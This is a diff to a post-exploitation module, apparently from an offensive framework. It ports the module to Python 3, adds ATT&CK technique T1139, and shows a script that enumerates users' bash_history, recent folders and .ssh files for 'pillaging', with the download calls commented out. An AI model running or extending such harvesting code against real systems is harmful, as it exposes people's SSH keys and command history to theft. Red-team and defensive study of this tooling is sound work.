@@ -1,4 +1,5 @@
-class Module:
+from builtins import object
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -13,6 +14,10 @@ class Module:
             # more verbose multi-line description of the module
             'Description': ("Pillages the current user for their bash_history, ssh known hosts, "
                             "recent folders, etc. "),
+
+            'Software': '',
+
+            'Techniques': ['T1139'],
 
             # True if the module needs to run in the background
             'Background' : False,
@@ -129,7 +134,7 @@ else:
 for userPath in userPaths:
     for searchPath in searchPaths:
         #downloadFile(userPath + searchPath)
-        print userPath + searchPath
+        print(userPath + searchPath)
 
     # grab all .ssh files
     filePath = os.path.expanduser(userPath + '/.ssh/')
@@ -137,9 +142,9 @@ for userPath in userPaths:
         sshFiles = [f for f in os.listdir(filePath) if os.path.isfile(os.path.join(filePath, f))]
         for sshFile in sshFiles:
             # downloadFile(userPath + '/.ssh/' + sshFile)
-            print userPath + '/.ssh/' + sshFile
+            print(userPath + '/.ssh/' + sshFile)
 
-print "pillaging complete"
+print("pillaging complete")
 """ % {'sleep': sleep, 'allUsers': allUsers}
 
         return script
